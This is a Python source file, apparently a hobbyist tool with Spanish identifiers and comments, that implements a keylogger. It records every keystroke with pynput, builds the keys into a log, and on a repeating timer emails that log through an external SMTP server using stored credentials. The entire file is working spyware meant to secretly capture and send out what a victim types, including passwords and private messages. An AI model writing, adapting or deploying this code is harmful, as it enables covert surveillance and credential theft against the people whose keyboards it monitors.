import smtplib
import pynput.keyboard
import threading
import smtplib

class Keylog:
    def __init__(self, intervalo_tiempo, email, password):
        self.tec = "preparado para leer" 
        self.interval = intervalo_tiempo
        self.email = email
        self.password = password
        

    def concatena_log(self, string):
        self.tec = self.tec + string

    def presion_tec(self, key):
        try:
            tecla_pres = str(key.char)
        except AttributeError:
            if key == key.space:
                tecla_pres = " "
            else:
                tecla_pres = " " + str(key) + " "
        self.concatena_log(tecla_pres)   
             
    def reporte(self):
        self.emv_mail(self.email, self.password, "\n\n" + self.tec)
        self.tec = ""
        tiempo = threading.Timer(self.interval, self.reporte)
        tiempo.start()
    
    def emv_mail(self, email, password, message):
        server =smtplib.SMTP("mail.messagingengine.com", 465)
        #editar el smtp al que usted guste
        server.starttls()
        server.login(email ,password)
        server.sendmail(email, email, message)
        server.quit()
    
    def iniciar(self):
        listado_teclado = pynput.keyboard.Listener(on_press = self.presion_tec)
        with listado_teclado:
            self.reporte()
            listado_teclado.join()